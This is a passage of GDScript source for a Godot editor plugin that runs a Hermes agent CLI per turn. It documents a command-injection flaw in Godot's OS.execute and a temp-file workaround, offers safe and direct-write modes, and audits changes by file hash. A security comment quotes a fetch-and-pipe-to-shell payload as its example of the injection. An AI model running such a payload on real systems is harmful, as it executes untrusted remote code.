@tool
extends Node

## hermes_bridge.gd - Process plumbing for a REAL Hermes agent, launched
## fresh per turn as `hermes chat -Q -q "<message>"` with the editor's
## own project directory as its working directory.
##
## This is the deliberate architectural break from
## addons/godot_ollama_task_performer/ollama_client.gd, which POSTs to
## Ollama's HTTP /api/chat endpoint and gets back plain text with no
## agentic capability at all. There is no equivalent here on purpose:
## no operation allowlist, no JSON command contract, no
## OperationRegistry-style parse-and-dispatch layer. Hermes keeps its own
## native tool-calling (file read/write, shell, search, tests) — this
## script's only job is: build the right command, run it with the right
## cwd, and hand back whatever Hermes actually said.
##
## SECURITY NOTE — read before changing how a message reaches Hermes:
## OS.execute() in this Godot build performs its own shell-style
## expansion ($VAR, `cmd`, $(cmd)) on EVERY element of its "arguments"
## array before the target process ever runs — verified directly, not
## assumed: a literal "$HOME" argument came back substituted, and a
## literal backtick-wrapped command was actually EXECUTED by Godot's own
## internal process-spawn layer. That makes passing a player-typed
## message straight through as a CLI argument a real command-injection
## vector (a message containing `` `curl evil | sh` `` would actually
## run it) — not a theoretical one, and no amount of manual shell-quoting
## on this script's own side fixes it, because Godot's expansion happens
## on the raw argument string BEFORE any bash of ours ever sees it.
##
## THE FIX, applied below: the message never enters OS.execute's
## "arguments" array at all. It's written to a plain temp file via
## FileAccess (zero shell/process involvement — proven safe, file
## content is never touched by the expansion pass, only arguments are).
## A wrapper script — built entirely from plugin-controlled strings
## (cwd, hermes path, temp paths this file itself generates; never the
## message) — reads that file via `cat` inside its own single, real bash
## parse. OS.execute() then runs THAT SCRIPT with an EMPTY arguments
## array, so there is nothing left for Godot's own expansion to find.
## This exact pattern was proven against a real adversarial payload
## (literal $(...), backticks, unset $VARs) before this file was written
## this way — see test_hermes_bridge_logic.gd in this same directory.
##
## First milestone success criterion (verbatim from the design
## instruction): "Hermes is genuinely sitting inside the editor and can
## inspect/edit the current project." Nothing in this file proves that
## on its own — only opening the real Godot editor, enabling this
## plugin, and sending a real message proves it. The command-
## construction and output-parsing logic below IS covered by a real,
## executed test; the actual editor-embedded Hermes call is not, and
## must not be reported as proven until someone does that by hand.
##
## WRITE MODES: SAFE/REVIEW remains the durable default contract and
## TEMPORARY DIRECT WRITE exists solely for the user-authorized maturity
## experiment. The dock makes the active mode explicit and reversible.
## SAFE/REVIEW redirects proposals to .hermes_scratch/. DIRECT WRITE
## explicitly supersedes that instruction for the selected turn so the
## resumed Hermes session may edit the live cwd. It does not grant commit,
## push, unrelated cleanup, or project-wide maintenance authority.
##
## Enforcement/audit is real, not just a prompt asking politely:
##   1. The selected mode's preamble is prepended to EVERY turn's message
##      so the active authority cannot fade in a resumed conversation.
##   2. A CONTENT FINGERPRINT of the entire live tree (excluding
##      SCRATCH_DIR_NAME and .git/ internals) is captured before and
##      after every turn — real SHA-256 per file, via path. Changed paths
##      are hard violations in SAFE/REVIEW and neutral mutation evidence
##      in DIRECT WRITE. See
##      _capture_tree_fingerprint()/diff_tree_fingerprints().
##
## CORRECTION (review, after Phase 1's first draft): the original
## mechanism compared `git status --porcelain` LINES before/after a
## turn, and only flagged a NEWLY-APPEARING line. That has a real,
## proven blind spot: a file that was ALREADY dirty (` M file.gd`) or
## ALREADY untracked (`?? notes.txt`) before the turn produces the
## IDENTICAL status line after the turn even if its actual bytes
## changed — git status classifies "is this file dirty," not "did this
## turn touch it." Proven with two real, executed RED-then-GREEN
## regressions before this fix was written (see
## test_hermes_bridge_logic.gd's own safety-audit section) — not
## reasoned about, demonstrated: an already-dirty tracked file and an
## already-untracked file were both silently overwritable under the
## old mechanism. `git status` output is retained for optional
## human-readable display (it's still what a person would actually run
## to inspect a violation) but is no longer the authority for whether
## anything actually changed — a real per-file content hash is.
##
## This does NOT structurally prevent writes — Hermes keeps real shell
## access. It makes every turn self-check against real file content. In
## SAFE/REVIEW, live-path changes are violations. In DIRECT WRITE, the
## same changed-path list is evidence for comparing the natural request
## with the exact mutation.

signal turn_finished(result: Dictionary)

const LifecycleProbe := preload("res://addons/hermes_editor/_lifecycle_probe.gd")
const EditReceiptStore := preload("res://addons/hermes_editor/edit_receipt_store.gd")

var session_id: String = ""  # empty until the first real reply names one
var _thread: Thread
var _discard_pending: bool = false
var _thread_body_active: bool = false  # INSTRUMENTATION — see _run_hermes()/_run_hermes_impl() split below


## INSTRUMENTATION — routes every bridge trace line through one place so
## bridge_id/thread_started/thread_body_active are on EVERY line, not
## just the ones that happened to mention them by hand. pid is added by
## LifecycleProbe.trace() itself.
func _bridge_trace(event: String) -> void:
	var thread_started := _thread != null and _thread.is_started()
	LifecycleProbe.trace(
		"bridge_id=%d | thread_started=%s | thread_body_active=%s | %s" % [
			get_instance_id(), str(thread_started), str(_thread_body_active), event
		]
	)

const _SESSION_ID_LINE_PATTERN := "^session_id:\\s*(\\S+)\\s*$"
const SCRATCH_DIR_NAME := ".hermes_scratch"
const MODE_SAFE_REVIEW := "SAFE_REVIEW"
const MODE_DIRECT_WRITE := "DIRECT_WRITE"

## Phase 1 sideband coordination lane (Dragon <-> Editor). This absolute
## path is NOT under project_root() — it's the same shared mailbox root
## hermes_session_adapter.py (in this same checkout, but the OTHER Godot
## process — the 3D runtime, not this editor) reads/writes from. See that
## file's own "Phase 1 sideband coordination lane" block for the adapter
## side of this exact contract: same directory names, same filename
## convention, same schema IDs.
const COORDINATION_ROOT := "/mnt/data-drive/engain-runtime-mailboxes/dragon3d/coordination"
const COORDINATION_OUTBOX_DIR := COORDINATION_ROOT + "/outbox"
const COORDINATION_OUTBOX_HANDLED_DIR := COORDINATION_ROOT + "/outbox_handled"
const COORDINATION_INBOX_DIR := COORDINATION_ROOT + "/inbox"
const DRAGON_REQUEST_SCHEMA_ID := "engain.dragon_request.v1"
const EDITOR_REPORT_SCHEMA_ID := "engain.editor_report.v1"
const DRAGON_REQUEST_KEYS: Array[String] = [
	"schema", "message_id", "parent_message_id", "source", "destination", "body", "created_at",
]


## The real, absolute filesystem path of the currently open Godot
## project — this is the `cwd` Hermes's own file/shell tools will
## operate against, so it must be the project root (res://'s target on
## disk), not any virtual/packed path.
static func project_root() -> String:
	return ProjectSettings.globalize_path("res://")


## TEARDOWN — proven necessary, not speculative (real, executed
## three-case investigation before this was written): freeing this Node
## while `_thread` is still alive (e.g. the editor closes, or the dock
## is disabled, while a Hermes turn is genuinely still in flight) left
## the background thread orphaned. Godot's own Thread destructor does
## NOT block/join a still-running thread — it prints "A Thread object
## is being destroyed without its completion having been realized" and
## effectively detaches it. The orphaned thread then runs to its own
## natural completion (the real OS.execute() call it's blocked on) with
## `self` already destroyed, and crashes with "Cannot call method
## 'call_deferred' on a previously freed instance" the moment
## _run_hermes() reaches its own final line. Reproduced directly, twice
## (once for the warning alone on an already-finished thread, once for
## the full crash on a genuinely in-flight one) before this handler was
## added.
##
## Fix: block on NOTIFICATION_PREDELETE until the thread's own function
## body has actually returned. NOTIFICATION_PREDELETE fires BEFORE the
## object's memory is actually reclaimed, so `_run_hermes()`'s own
## `call_deferred("_emit_result", ...)` — its very last line — executes
## against a still-valid `self`, and by the time this handler returns
## and the object is actually destroyed, the thread is already properly
## joined (no warning) and its one remaining deferred call has already
## been safely queued.
##
## Deliberately NOT process-killing: per instruction, don't add
## aggressive termination of the wrapper/Hermes child process without
## first knowing the exact process tree it creates — killing the
## wrapper while leaving a Hermes subprocess (or vice versa) orphaned
## would be worse than the problem being fixed. Blocking is the
## conservative choice already established by Stop's own semantics
## ("let it finish, don't try to kill it") — applied here to teardown
## as well. Practical consequence, stated plainly for the README: if
## the editor is closed (or the plugin disabled) while a turn is
## genuinely in flight, teardown WAITS for that turn to finish first —
## it does not hang forever (bounded by however long the real
## hermes/model call takes), but it is not instant either.
func _notification(what: int) -> void:
	if what == NOTIFICATION_PREDELETE:
		_bridge_trace("_notification: NOTIFICATION_PREDELETE begin")
		if _thread != null and _thread.is_started():
			_bridge_trace("_notification: entering _thread.wait_to_finish() — will block here if the thread body is still running")
			_thread.wait_to_finish()
			_bridge_trace("_notification: _thread.wait_to_finish() returned")
		_bridge_trace("_notification: NOTIFICATION_PREDELETE end")
	elif what == NOTIFICATION_EXIT_TREE:
		_bridge_trace("_notification: NOTIFICATION_EXIT_TREE")
	elif what == NOTIFICATION_UNPARENTED:
		_bridge_trace("_notification: NOTIFICATION_UNPARENTED")


## Starts one turn in a background thread — OS.execute() blocks, and a
## real Hermes call can take several seconds to minutes; running it on
## the main thread would freeze the whole editor UI, not just this dock.
## Emits turn_finished (via call_deferred, so it lands safely on the main
## thread) when the subprocess returns, one way or another.
func send(
	message: String,
	model: String = "",
	provider: String = "",
	mode: String = MODE_SAFE_REVIEW
) -> void:
	if _thread and _thread.is_started():
		_thread.wait_to_finish()
	var hermes_path := find_hermes_executable()
	_thread = Thread.new()
	_bridge_trace("send: starting new turn thread")
	_thread.start(_run_hermes.bind(hermes_path, message, session_id, model, provider, project_root(), mode))


## Marks the currently in-flight reply to be discarded once it returns.
## This is NOT process cancellation — there is no cooperative way to kill
## a synchronous OS.execute() call, and no PID is available to signal.
## The underlying hermes subprocess keeps running to completion either
## way; only the dock's own handling of that eventual result changes.
## Matches this project's own established honesty convention for a
## "can't actually stop it" limitation — see
## addons/godot_ollama_task_performer/README.md's own "Known
## Limitations" section on run_scene for the precedent.
func request_stop() -> void:
	_discard_pending = true


## INSTRUMENTATION — thin wrapper around the actual thread body
## (_run_hermes_impl, unchanged below) so _thread_body_active is set/
## cleared around EVERY return path in one place, instead of having to
## chase down each of _run_hermes_impl's own early returns individually.
## Thread.start() still binds to this exact function name/signature —
## nothing about how the thread is started changes.
func _run_hermes(
	hermes_path: String,
	message: String,
	resume_session_id: String,
	model: String,
	provider: String,
	cwd: String,
	mode: String
) -> void:
	_thread_body_active = true
	_bridge_trace("_run_hermes: thread body entered")
	_run_hermes_impl(hermes_path, message, resume_session_id, model, provider, cwd, mode)
	_bridge_trace("_run_hermes: thread body returning")
	_thread_body_active = false


func _run_hermes_impl(
	hermes_path: String,
	message: String,
	resume_session_id: String,
	model: String,
	provider: String,
	cwd: String,
	mode: String
) -> void:
	var effective_mode := normalize_mode(mode)
	var result := {
		"success": false,
		"response": "",
		"session_id": "",
		"error": "",
		"live_tree_changes": PackedStringArray(),
		"safety_check_available": false,
		"mode": effective_mode,
		"edit_id": "",
		"edit_receipt_state": "",
		"edit_receipt_paths": [],
	}

	if hermes_path.is_empty():
		result["error"] = "hermes executable not found (checked PATH and common install locations)."
		call_deferred("_emit_result", result)
		return

	# _ensure_scratch_setup() (creates .hermes_scratch/, adds it to
	# .gitignore) is deliberately NOT called here, per review correction:
	# the bridge should not quietly mutate the live repository as part
	# of every turn in a mode whose whole contract is "proposals only."
	# It runs once, at plugin activation time, from hermes_dock.gd's own
	# _ready() — see that file. If it hasn't run yet for some reason
	# (e.g. a future caller that skips the dock), the fingerprint audit
	# below still works correctly either way: SCRATCH_DIR_NAME is
	# excluded from the walk regardless of whether the directory exists
	# yet or is gitignored.
	# DIRECT_WRITE additionally keeps the pre-turn BYTES (not just hashes)
	# in memory for the duration of this one turn, so a per-edit revert
	# receipt can be built after the fact from whichever paths actually
	# changed — see edit_receipt_store.gd's own top-of-file doc. SAFE/
	# REVIEW keeps the cheaper hash-only fingerprint since nothing on
	# disk is expected to change in that mode.
	var edit_id := ""
	var snapshot_before := {}
	var fingerprint_before := {}
	if effective_mode == MODE_DIRECT_WRITE:
		edit_id = EditReceiptStore.generate_edit_id()
		snapshot_before = EditReceiptStore.capture_tree_snapshot(cwd)
		for k in snapshot_before.keys():
			fingerprint_before[k] = (snapshot_before[k] as Dictionary)["sha256"]
	else:
		fingerprint_before = _capture_tree_fingerprint(cwd)
	result["safety_check_available"] = true  # filesystem walk, not git-dependent — see _capture_tree_fingerprint()

	var unique := "%d_%d" % [Time.get_ticks_usec(), randi()]
	var tmp_dir := OS.get_temp_dir()
	var query_path := tmp_dir.path_join("hermes_editor_query_%s.txt" % unique)
	var script_path := tmp_dir.path_join("hermes_editor_run_%s.sh" % unique)

	var full_message := build_mode_message(effective_mode, cwd, message)
	var write_err := _write_query_file(query_path, full_message)
	if write_err != OK:
		result["error"] = "failed to write temp query file (%s): error %d" % [query_path, write_err]
		call_deferred("_emit_result", result)
		return

	var script_content := build_wrapper_script(hermes_path, query_path, cwd, resume_session_id, model, provider)
	var script_err := _write_query_file(script_path, script_content)  # same plain-write helper; no shell involved either way
	if script_err != OK:
		result["error"] = "failed to write temp wrapper script (%s): error %d" % [script_path, script_err]
		_cleanup_temp_files([query_path])
		call_deferred("_emit_result", result)
		return

	var output: Array = []
	# Empty arguments array on purpose — see this file's own top-of-file
	# SECURITY NOTE. script_path is plugin-generated (temp dir + a
	# numeric suffix), never user content, so even though Godot's own
	# expansion pass still runs on it, there is nothing in it for that
	# pass to corrupt.
	var exit_code := OS.execute("/bin/bash", [script_path], output, true)
	var combined := "\n".join(output)
	_cleanup_temp_files([query_path, script_path])

	# Safe-mode audit: runs regardless of exit_code/success — a
	# violation matters even on an otherwise-failed turn. Content-hash
	# based (see _capture_tree_fingerprint()'s own doc for why a git-
	# status-line diff was NOT sufficient — it missed changes to files
	# that were already dirty/untracked before the turn started).
	var fingerprint_after := _capture_tree_fingerprint(cwd)
	result["live_tree_changes"] = diff_tree_fingerprints(fingerprint_before, fingerprint_after)

	# One receipt per DIRECT_WRITE turn that actually touched the live
	# tree — mechanical revert bookkeeping only; no bearing on whether
	# this turn itself succeeded or failed. See edit_receipt_store.gd.
	if effective_mode == MODE_DIRECT_WRITE and not result["live_tree_changes"].is_empty():
		var receipt := EditReceiptStore.create_receipt(edit_id, snapshot_before, fingerprint_after)
		result["edit_id"] = edit_id
		result["edit_receipt_state"] = receipt.get("state", "AVAILABLE")
		result["edit_receipt_paths"] = receipt.get("paths", [])

	var sid := extract_session_id(combined)
	if not sid.is_empty():
		result["session_id"] = sid
		session_id = sid  # only ever advances on a real reply, same rule as EngAIn's own cursor (never guessed, never on failure)

	if exit_code != 0:
		result["error"] = "hermes exited %d:\n%s" % [exit_code, combined]
		call_deferred("_emit_result", result)
		return

	result["success"] = true
	result["response"] = strip_session_line(combined)
	call_deferred("_emit_result", result)


## Sent as a prefix on EVERY turn's message — not once at session start —
## specifically so the rule can't fade out of a long conversation's
## effective context the way a single early instruction can. project_root
## is spelled out explicitly so "the live project" and "the scratch area"
## are never ambiguous relative paths. Built as one fully-formatted
## template (a single %-substitution over the whole block, three
## positional args) rather than chained +/% fragments — unambiguous to
## read and to verify, no operator-precedence guessing required.
static func build_safe_mode_preamble(project_root: String) -> String:
	var template := (
		"SAFE/REVIEW MODE is active for this session. You have full read, search, shell, and test access to this project (working directory: %s). Run tests, inspect code, and reason freely.\n"
		+ "\n"
		+ "However: do NOT create, modify, move, rename, or delete any file inside this project's live tree. If your response involves a code change, write your COMPLETE proposed file (or a patch) into ./%s/ instead, using a path that mirrors the file you're proposing to change — e.g. a change to scripts/Dragon.gd becomes %s/scripts/Dragon.gd. A human reviews and applies every change from there; nothing you write to %s/ affects the live project automatically. This rule applies to this turn and every future turn in this session, regardless of what was said earlier.\n"
		+ "\n"
		+ "---\n"
		+ "\n"
	)
	return template % [project_root, SCRATCH_DIR_NAME, SCRATCH_DIR_NAME, SCRATCH_DIR_NAME]


static func build_direct_write_preamble(project_root: String) -> String:
	return (
		"TEMPORARY DIRECT WRITE MODE is active for this turn. This explicitly supersedes every earlier SAFE/REVIEW or scratch-only instruction in the resumed session. The user has authorized you to modify the LIVE project directly (working directory: %s), including creating, modifying, moving, renaming, or deleting files when the request requires it. Do not route the requested implementation through .hermes_scratch/. Apply the user's natural request to the live project.\n"
		+ "\n"
		+ "This is a temporary maturity experiment, not broad maintenance authorization: make only the requested edit; do not commit, push, clean up unrelated files, or change unrelated project settings.\n"
		+ "\n---\n\n"
	) % project_root


static func normalize_mode(mode: String) -> String:
	return MODE_DIRECT_WRITE if mode == MODE_DIRECT_WRITE else MODE_SAFE_REVIEW


static func build_mode_message(mode: String, project_root: String, message: String) -> String:
	if normalize_mode(mode) == MODE_DIRECT_WRITE:
		return build_direct_write_preamble(project_root) + message
	return build_safe_mode_preamble(project_root) + message


## Creates the scratch dir if missing and makes sure it's gitignored, so
## scratch proposals never get accidentally tracked/committed. INSTALL-
## TIME ONLY — called once from hermes_dock.gd's _ready() (i.e. when
## this editor plugin activates), never from _run_hermes() on every
## turn. Review correction: the bridge itself should not quietly mutate
## the live repository (editing .gitignore) as a side effect of every
## single message sent in a mode whose entire contract is "proposals
## only, nothing touches the live tree automatically" — doing exactly
## that to .gitignore, silently, on every turn, would have been an
## unstated exception to the bridge's own rule. One explicit, documented
## mutation at plugin-activation time is a materially different, smaller
## claim than "mutates the repo as a side effect of chat." Best-effort:
## a project without write access to .gitignore doesn't block plugin
## activation over this — the fingerprint-based safety check below
## works correctly regardless of whether this ever succeeds, since it
## excludes SCRATCH_DIR_NAME structurally, not via .gitignore.
static func _ensure_scratch_setup(project_root: String) -> void:
	var scratch_path := project_root.path_join(SCRATCH_DIR_NAME)
	if not DirAccess.dir_exists_absolute(scratch_path):
		DirAccess.make_dir_recursive_absolute(scratch_path)

	var gitignore_path := project_root.path_join(".gitignore")
	var ignore_line := "/%s/" % SCRATCH_DIR_NAME
	var existing := ""
	if FileAccess.file_exists(gitignore_path):
		var reader := FileAccess.open(gitignore_path, FileAccess.READ)
		if reader != null:
			existing = reader.get_as_text()
			reader.close()
	if existing.contains(SCRATCH_DIR_NAME):
		return  # already ignored in some form — don't duplicate
	var writer := FileAccess.open(gitignore_path, FileAccess.READ_WRITE if FileAccess.file_exists(gitignore_path) else FileAccess.WRITE)
	if writer == null:
		return  # best-effort — no .gitignore write access is not fatal
	writer.seek_end()
	if not existing.is_empty() and not existing.ends_with("\n"):
		writer.store_string("\n")
	writer.store_string(ignore_line + "\n")
	writer.close()


## OPTIONAL HUMAN-DISPLAY HELPER ONLY — not the safety authority.
## Runs `git status --porcelain` against project_root. Kept per review
## instruction ("Keep Git status as useful human-readable reporting")
## for a caller that wants a familiar, inspectable summary; NOT used by
## _run_hermes() to decide whether a violation occurred — see
## _capture_tree_fingerprint()/diff_tree_fingerprints() for that, and
## this function's own sibling diff_live_tree_changes()'s doc for
## exactly why a git-status-line diff is insufficient as the authority.
## Returns {"available": bool, "lines": PackedStringArray} rather than
## raising — a project that isn't a git repo, or a machine without git,
## degrades to "unavailable" rather than raising.
static func _capture_git_status(project_root: String) -> Dictionary:
	var output: Array = []
	var exit_code := OS.execute("/usr/bin/git", ["-C", project_root, "status", "--porcelain"], output, true)
	if exit_code != 0:
		return {"available": false, "lines": PackedStringArray()}
	var lines: PackedStringArray = []
	for l in output:
		for sub in String(l).split("\n"):
			if not sub.strip_edges().is_empty():
				lines.append(sub)
	return {"available": true, "lines": lines}


## OPTIONAL HUMAN-DISPLAY HELPER ONLY — NOT the safety authority (see
## the correction in this file's own top-of-file doc). Kept and tested
## for whatever inspection value it still has, but _run_hermes() no
## longer calls this — proven, not just reasoned about, that comparing
## raw git-status LINES before/after a turn misses real content changes
## to a file that was already dirty (` M file.gd` before AND after,
## content changed) or already untracked (`?? notes.txt` before AND
## after, content changed) — the status line itself doesn't encode file
## content, only dirty/clean classification, so an identical line can
## hide a real edit. diff_tree_fingerprints() is the actual gate.
static func diff_live_tree_changes(before_lines: PackedStringArray, after_lines: PackedStringArray) -> PackedStringArray:
	var before_set := {}
	for l in before_lines:
		before_set[l] = true
	var scratch_prefix := SCRATCH_DIR_NAME + "/"
	var violations: PackedStringArray = []
	for l in after_lines:
		if before_set.has(l):
			continue
		# porcelain format: "XY path" (or "XY orig -> new" for renames) —
		# the path starts at column index 3.
		var path_part := l.substr(3) if l.length() > 3 else l
		if path_part.begins_with(scratch_prefix) or path_part.begins_with("./" + scratch_prefix):
			continue
		violations.append(l)
	return violations


## THE SAFETY AUTHORITY. Walks project_root recursively (excluding
## SCRATCH_DIR_NAME, .git/, and .godot/ — see the exclusion list below)
## and returns a Dictionary of {relative_path: sha256_hex} for every
## real file found. Directories themselves aren't fingerprinted (a
## create/delete of a directory is already implied by its files' own
## entries appearing/disappearing in the map).
##
## .git/ is excluded deliberately, not incidentally: `git status` itself
## (called elsewhere for the optional display helper above) can rewrite
## .git/index for its own stat-cache bookkeeping — fingerprinting .git/
## internals would risk flagging that as a "violation" with nothing to
## do with anything Hermes did.
##
## .godot/ is excluded for the identical reason, confirmed against a
## real receipt: a DIRECT_WRITE turn that Hermes limited to
## scenes/Main.tscn nonetheless produced a fingerprint diff that also
## included .godot/editor/filesystem_cache10 — Godot's own editor
## filesystem cache, rewritten by the editor's own scan/reimport
## machinery (e.g. after a "Reload from disk" following an external
## edit), not authored by Hermes or the user. Without this exclusion,
## every DIRECT_WRITE receipt risks silently absorbing Godot's own
## housekeeping writes as if they were part of the requested edit — and
## since that cache can keep changing between when a receipt is created
## and when its Revert is eventually pressed, an otherwise-legitimate
## revert could be refused later for a mismatch that has nothing to do
## with what the user or Hermes actually changed.
static func _capture_tree_fingerprint(project_root: String) -> Dictionary:
	var fingerprint := {}
	_walk_and_fingerprint(project_root, project_root, fingerprint)
	return fingerprint


const _FINGERPRINT_EXCLUDED_DIR_NAMES := [".git", ".godot", SCRATCH_DIR_NAME]


static func _walk_and_fingerprint(root: String, current_dir: String, out: Dictionary) -> void:
	var dir := DirAccess.open(current_dir)
	if dir == null:
		return  # unreadable directory — degrades silently for that subtree, not fatal to the whole walk
	dir.include_hidden = true
	dir.list_dir_begin()
	var entry_name := dir.get_next()
	while entry_name != "":
		if entry_name == "." or entry_name == "..":
			entry_name = dir.get_next()
			continue
		var full_path := current_dir.path_join(entry_name)
		if dir.current_is_dir():
			if not _FINGERPRINT_EXCLUDED_DIR_NAMES.has(entry_name):
				_walk_and_fingerprint(root, full_path, out)
		else:
			var rel_path := full_path.trim_prefix(root)
			if rel_path.begins_with("/"):
				rel_path = rel_path.substr(1)
			out[rel_path] = FileAccess.get_sha256(full_path)
		entry_name = dir.get_next()
	dir.list_dir_end()


## Compares two _capture_tree_fingerprint() results and returns a
## human-readable line per path that differs — created, deleted, or
## modified — EXCLUDING anything inside SCRATCH_DIR_NAME (a proposal
## landing there is expected, not a violation). A rename shows up
## naturally as one "deleted: <old>" plus one "created: <new>" pair —
## no separate rename-detection logic needed, since both halves are
## already individually correct violations under this project's actual
## contract (a rename outside the scratch dir is still an unauthorized
## live-tree mutation, whether or not this function labels it "rename"
## specifically). Empty return = provably byte-identical live tree
## before and after the turn.
static func diff_tree_fingerprints(before: Dictionary, after: Dictionary) -> PackedStringArray:
	var scratch_prefix := SCRATCH_DIR_NAME + "/"
	var all_paths := {}
	for k in before.keys():
		all_paths[k] = true
	for k in after.keys():
		all_paths[k] = true

	var violations: PackedStringArray = []
	for path in all_paths.keys():
		var path_str := String(path)
		if path_str.begins_with(scratch_prefix):
			continue
		var before_hash: String = before.get(path, "")
		var after_hash: String = after.get(path, "")
		if before_hash == after_hash:
			continue
		if before_hash.is_empty():
			violations.append("created: %s" % path_str)
		elif after_hash.is_empty():
			violations.append("deleted: %s" % path_str)
		else:
			violations.append("modified: %s" % path_str)
	violations.sort()
	return violations


func _emit_result(result: Dictionary) -> void:
	if _discard_pending:
		_discard_pending = false
		return
	turn_finished.emit(result)


static func _write_query_file(path: String, content: String) -> Error:
	var handle := FileAccess.open(path, FileAccess.WRITE)
	if handle == null:
		return FileAccess.get_open_error()
	handle.store_string(content)
	handle.close()
	return OK


static func _cleanup_temp_files(paths: PackedStringArray) -> void:
	for p in paths:
		if FileAccess.file_exists(p):
			DirAccess.remove_absolute(p)


## Builds the wrapper script's full text. Every dynamic piece here is
## plugin-controlled (cwd, hermes_path, the query file's own path,
## session_id/model/provider fields from the dock's own small text
## inputs) — the actual player-typed message is NEVER embedded in this
## string; the script reads it itself, at run time, via `cat`. Uses
## real shell_quote() single-quote escaping throughout, which is correct
## and sufficient here specifically BECAUSE this string becomes real
## FILE CONTENT executed by a genuine, single bash parse — the exact
## case shell_quote() was designed for (see this file's own SECURITY
## NOTE for why the same escaping was NOT sufficient when these pieces
## were previously assembled into an OS.execute() "arguments" element
## instead of a script file).
##
## -Q            quiet mode: only the final response + session info, no
##               banner/spinner/tool-call previews — required for this
##               to be parseable rather than a scrollback dump.
## --source tool marks this as a third-party integration session (per
##               `hermes chat --help`'s own description), matching how
##               this project's other tool-side Hermes callers identify
##               themselves (see tools/live_dispatch_mutex_contention_proof.py).
## --pass-session-id includes the session ID in Hermes's own system
##               prompt — same flag this project's other adapters use.
## --resume <id> only appended once a prior turn has actually reported a
##               session_id — the very first turn in a fresh dock has
##               none yet and starts a new Hermes session.
## model/provider only appended if the dock's own fields are non-empty —
##               otherwise Hermes's own configured defaults apply,
##               exactly as they would from a normal terminal.
## Deliberately NOT passed: --ignore-rules, --ignore-user-config,
## --safe-mode. Those strip AGENTS.md/memory/skills/plugin injection —
## appropriate for an isolated reproducibility proof (which is where this
## project's existing live-proof scripts use them), wrong for a real
## working seat that should behave exactly like Hermes anywhere else.
static func build_wrapper_script(hermes_path: String, query_path: String, cwd: String, resume_session_id: String, model: String, provider: String) -> String:
	var lines: PackedStringArray = [
		"#!/bin/bash",
		"set -o errexit",
		"cd %s" % shell_quote(cwd),
	]
	var invocation := "%s chat -Q --source tool --pass-session-id" % shell_quote(hermes_path)
	if not resume_session_id.is_empty():
		invocation += " --resume %s" % shell_quote(resume_session_id)
	if not model.is_empty():
		invocation += " -m %s" % shell_quote(model)
	if not provider.is_empty():
		invocation += " --provider %s" % shell_quote(provider)
	# $(cat ...) inside double quotes: a single, real bash parse of a
	# script FILE (not an OS.execute argument) — the message's exact
	# content, including embedded spaces/quotes/$/backticks, becomes the
	# literal -q value. Command substitution strips trailing newlines
	# (POSIX-defined); harmless for a single-line chat message.
	invocation += ' -q "$(cat %s)"' % shell_quote(query_path)
	lines.append(invocation)
	return "\n".join(lines) + "\n"


## POSIX single-quote escaping: wrap in single quotes, and turn any
## embedded single quote into '\'' (close quote, escaped literal quote,
## reopen quote). Correct and sufficient for content that becomes real
## script-file text interpreted by a genuine single bash parse — see
## this file's own SECURITY NOTE for the one case (an OS.execute()
## "arguments" element) where this is NOT sufficient on its own.
static func shell_quote(s: String) -> String:
	return "'" + s.replace("'", "'\\''") + "'"


## Extracts the session_id Hermes reports (in -Q mode, on its own line —
## see this project's own tools/live_dispatch_mutex_contention_proof.py
## for the same pattern against real Hermes output) from combined
## stdout+stderr. Returns "" if none is present (a failed call, or an
## unexpected output shape).
static func extract_session_id(combined_output: String) -> String:
	var pattern := RegEx.new()
	pattern.compile(_SESSION_ID_LINE_PATTERN)
	for line in combined_output.split("\n"):
		var m := pattern.search(line)
		if m:
			return m.get_string(1)
	return ""


## Removes the session_id line(s) from the combined output, leaving just
## Hermes's actual reply text for display in the transcript.
static func strip_session_line(combined_output: String) -> String:
	var pattern := RegEx.new()
	pattern.compile(_SESSION_ID_LINE_PATTERN)
	var kept: PackedStringArray = []
	for line in combined_output.split("\n"):
		if pattern.search(line):
			continue
		kept.append(line)
	return "\n".join(kept).strip_edges()


## Resolves the hermes executable. Checked in order: common fixed
## install locations, then `which hermes` as a fallback for anything
## this hardcoded list doesn't guess. Safe from the OS.execute expansion
## issue regardless — "hermes" and the fixed candidate paths are all
## plugin-authored literals, never user content.
static func find_hermes_executable() -> String:
	var candidates: PackedStringArray = ["/usr/bin/hermes", "/usr/local/bin/hermes"]
	var home := OS.get_environment("HOME")
	if not home.is_empty():
		candidates.append(home.path_join(".local/bin/hermes"))
	for c in candidates:
		if FileAccess.file_exists(c):
			return c
	var which_output: Array = []
	var which_exit := OS.execute("/usr/bin/which", ["hermes"], which_output)
	if which_exit == 0 and not which_output.is_empty():
		return String(which_output[0]).strip_edges()
	return ""


## --- Phase 1 sideband coordination lane (Dragon <-> Editor) --------------
##
## Reusable, non-UI mechanics only. hermes_dock.gd owns sequencing
## (busy-state, calling send(), reacting to turn_finished) — same division
## of responsibility as everywhere else in this file.

## Lists every syntactically-valid pending Dragon request currently sitting
## in COORDINATION_OUTBOX_DIR, oldest filename first. Malformed entries are
## silently skipped here (not deleted, not surfaced as an error) — an
## adapter-side bug producing a bad file should not crash or spam this
## dock; it just never becomes a visible pending request until fixed.
## Returns an Array of {"path": String, "request": Dictionary}.
static func list_pending_dragon_requests() -> Array:
	var out: Array = []
	var dir := DirAccess.open(COORDINATION_OUTBOX_DIR)
	if dir == null:
		return out
	dir.list_dir_begin()
	var names: PackedStringArray = []
	var entry_name := dir.get_next()
	while entry_name != "":
		if not dir.current_is_dir() and entry_name.ends_with(".json"):
			names.append(entry_name)
		entry_name = dir.get_next()
	dir.list_dir_end()
	names.sort()
	for name in names:
		var full_path := COORDINATION_OUTBOX_DIR.path_join(name)
		var request := _read_dragon_request(full_path)
		if not request.is_empty():
			out.append({"path": full_path, "request": request})
	return out


static func _read_dragon_request(path: String) -> Dictionary:
	if not FileAccess.file_exists(path):
		return {}
	var reader := FileAccess.open(path, FileAccess.READ)
	if reader == null:
		return {}
	var text := reader.get_as_text()
	reader.close()
	var parsed: Variant = JSON.parse_string(text)
	if typeof(parsed) != TYPE_DICTIONARY:
		return {}
	var payload: Dictionary = parsed
	var keys := payload.keys()
	if keys.size() != DRAGON_REQUEST_KEYS.size():
		return {}
	for key in keys:
		if key not in DRAGON_REQUEST_KEYS:
			return {}
	if payload.get("schema") != DRAGON_REQUEST_SCHEMA_ID:
		return {}
	if payload.get("source") != "dragon3d" or payload.get("destination") != "editor":
		return {}
	if typeof(payload.get("message_id")) != TYPE_STRING or String(payload["message_id"]).is_empty():
		return {}
	if typeof(payload.get("body")) != TYPE_STRING:
		return {}
	return payload


## Moves a handled request out of the outbox so list_pending_dragon_requests()
